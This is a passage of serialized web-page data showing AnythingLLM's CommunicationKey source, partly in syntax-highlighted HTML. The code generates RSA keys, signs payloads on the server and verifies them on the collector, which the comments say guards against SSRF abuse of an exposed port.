class=\"token operator\"\u003e=\u003c/span\u003e\n  process\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eenv\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token constant\"\u003eNODE_ENV\u003c/span\u003e \u003cspan class=\"token operator\"\u003e===\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"development\"\u003c/span\u003e\n    \u003cspan class=\"token operator\"\u003e?\u003c/span\u003e path\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eresolve\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e__dirname\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token string\"\u003e../../../server/storage/comkey\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token operator\"\u003e:\u003c/span\u003e path\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eresolve\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eprocess\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eenv\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token constant\"\u003eSTORAGE_DIR\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token string\"\u003ecomkey\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eCommunicationKey\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n  #pubKeyName \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"ipc-pub.pem\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  #storageLoc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e keyPath\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"token function\"\u003econstructor\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"token function\"\u003elog\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003etext\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e...\u003c/span\u003eargs\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    console\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003elog\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token string\"\u003e\\x1b[36m[CommunicationKeyVerify]\\x1b[0m \u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e${\u003c/span\u003etext\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e...\u003c/span\u003eargs\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"token function\"\u003e#readPublicKey\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e fs\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ereadFileSync\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eresolve\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e#storageLoc\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e#pubKeyName\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"token comment\"\u003e// Given a signed payload from private key from /app/server/ this signature should\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// decode to match the textData provided. This class does verification only in collector.\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// Note: The textData is typically the JSON stringified body sent to the document processor API.\u003c/span\u003e\n  \u003cspan class=\"token function\"\u003everify\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esignature \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e textData \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003etry\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"token keyword\"\u003elet\u003c/span\u003e data \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e textData\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003etypeof\u003c/span\u003e textData \u003cspan class=\"token operator\"\u003e!==\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"string\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e data \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token constant\"\u003eJSON\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003estringify\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edata\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e crypto\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003everify\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\n        \u003cspan class=\"token string\"\u003e\"RSA-SHA256\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        Buffer\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003efrom\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edata\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003e#readPublicKey\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        Buffer\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003efrom\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esignature\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"hex\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ecatch\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003efalse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\nmodule\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eexports \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e CommunicationKey \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"3e:Tad0,"])</script><script>self.__next_f.push([1,"const crypto = require(\"crypto\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\nconst keyPath =\n  process.env.NODE_ENV === \"development\"\n    ? path.resolve(__dirname, `../../storage/comkey`)\n    : path.resolve(process.env.STORAGE_DIR, `comkey`);\n\n// What does this class do?\n// This class generates a hashed version of some text (typically a JSON payload) using a rolling RSA key\n// that can then be appended as a header value to do integrity checking on a payload. Given the\n// nature of this class and that keys are rolled constantly, this protects the request\n// integrity of requests sent to the collector as only the server can sign these requests.\n// This keeps accidental misconfigurations of AnythingLLM that leaving port 8888 open from\n// being abused or SSRF'd by users scraping malicious sites who have a loopback embedded in a \u003cscript\u003e, for example.\n// Since each request to the collector must be signed to be valid, unsigned requests directly to the collector\n// will be dropped and must go through the /server endpoint directly.\nclass CommunicationKey {\n  #privKeyName = \"ipc-priv.pem\";\n  #pubKeyName = \"ipc-pub.pem\";\n  #storageLoc = keyPath;\n\n  // Init the class and determine if keys should be rolled.\n  // This typically occurs on boot up so key is fresh each boot.\n  constructor(generate = false) {\n    if (generate) this.#generate();\n  }\n\n  log(text, ...args) {\n    console.log(`\\x1b[36m[CommunicationKey]\\x1b[0m ${text}`, ...args);\n  }\n\n  #readPrivateKey() {\n    return fs.readFileSync(path.resolve(this.#storageLoc, this.#privKeyName));\n  }\n\n  #generate() {\n    const keyPair = crypto.generateKeyPairSync(\"rsa\", {\n      modulusLength: 2048,\n      publicKeyEncoding: {\n        type: \"pkcs1\",\n        format: \"pem\",\n      },\n      privateKeyEncoding: {\n        type: \"pkcs1\",\n        format: \"pem\",\n      },\n    });\n\n    if (!fs.existsSync(this.#storageLoc))\n      fs.mkdirSync(this.#storageLoc, { recursive: true });\n    fs.writeFileSync(\n      `${path.resolve(this.#storageLoc, this.#privKeyName)}`,\n      keyPair.privateKey\n    );\n    fs.writeFileSync(\n      `${path.resolve(this.#storageLoc, this.#pubKeyName)}`,\n      keyPair.publicKey\n    );\n    this.log(\n      \"RSA key pair generated for signed payloads within AnythingLLM services.\"\n    );\n  }\n\n  // This instance of ComKey on server is intended for generation of Priv/Pub key for signing and decoding.\n  // this resource is shared with /collector/ via a class of the same name in /utils which does decoding/verification only\n  // while this server class only does signing with the private key.\n  sign(textData = \"\") {\n    return crypto\n      .sign(\"RSA-SHA256\", Buffer.from(textData), this.#readPrivateKey())\n      .toString(\"hex\");\n  }\n}\n\nmodule.exports = { CommunicationKey };\n"])</script><script>self.__next_f.push([1,"3f:T377e,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e crypto \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erequire\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"crypto\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e fs \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erequire\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"fs\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e path \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erequire\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"path\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e keyPath \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\n  process\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eenv\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token constant\"\u003eNODE_ENV\u003c/span\u003e \u003cspan class=\"token operator\"\u003e===\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"development\"\u003c/span\u003e\n    \u003cspan class=\"token operator\"\u003e?\u003c/span\u003e path\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eresolve\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e__dirname\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token string\"\u003e../../storage/comkey\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token operator\"\u003e:\u003c/span\u003e path\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eresolve\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eprocess\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eenv\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token constant\"\u003eSTORAGE_DIR\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token string\"\u003ecomkey\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// What does this class do?\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// This class generates a hashed version of some text (typically a JSON payload) using a rolling RSA key\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// that can then be appended as a header value to do integrity checking on a payload. Given the\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// nature of this class and that keys are rolled constantly, this protects the request\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// integrity of requests sent to the collector as only the server can sign these requests.\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// This keeps accidental misconfigurations of AnythingLLM that leaving port 8888 open from\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// being abused or SSRF'd by users scraping malicious sites who have a loopback embedded in a \u0026lt;script\u003e, for example.\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// Since each request to the collector must be signed to be valid, unsigned requests directly to the collector\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// will be dropped and must go through the /server endpoint directly.\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eCommunicationKey\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n  #privKeyName \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"ipc-priv.pem\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  #pubKeyName \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"ipc-pub.pem\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  #storageLoc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e keyPath\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"token comment\"\u003e// Init the class and determine if keys should be rolled.\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// This typically occurs on boot up so key is fresh each boot.\u003c/span\u003e\n  \u003cspan class=\"token function\"\u003econstructor\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003egenerate \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token boolean\"\u003efalse\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003egenerate\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003e#generate\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"token function\"\u003elog\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003etext\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e...\u003c/span\u003eargs\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    console\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003elog\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token string\"\u003e\\x1b[36m[CommunicationKey]\\x1b[0m \u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e${\u003c/span\u003etext\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e...\u003c/span\u003eargs\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"token function\"\u003e#readPrivateKey\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e fs\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ereadFileSync\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eresolve\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e#storageLoc\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e#privKeyName\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"token function\"\u003e#generate\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e keyPair \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e crypto\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003egenerateKeyPairSync\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"rsa\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"token literal-property property\"\u003emodulusLength\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token number\"\u003e2048\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"token literal-property property\"\u003epublicKeyEncoding\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003etype\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"pkcs1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003eformat\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"pem\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"token literal-property property\"\u003eprivateKeyEncoding\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003etype\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"pkcs1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003eformat\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"pem\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003efs\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eexistsSync\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e#storageLoc\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n      fs\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003emkdirSync\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e#storageLoc\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e \u003cspan class=\"token literal-property property\"\u003erecursive\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token boolean\"\u003etrue\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    fs\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ewriteFileSync\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\n      \u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e${\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eresolve\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e#storageLoc\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e#privKeyName\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n      keyPair\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eprivateKey\n    \u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    fs\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ewriteFileSync\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\n      \u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e${\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eresolve\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e#storageLoc\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e#pubKeyName\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n      keyPair\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epublicKey\n    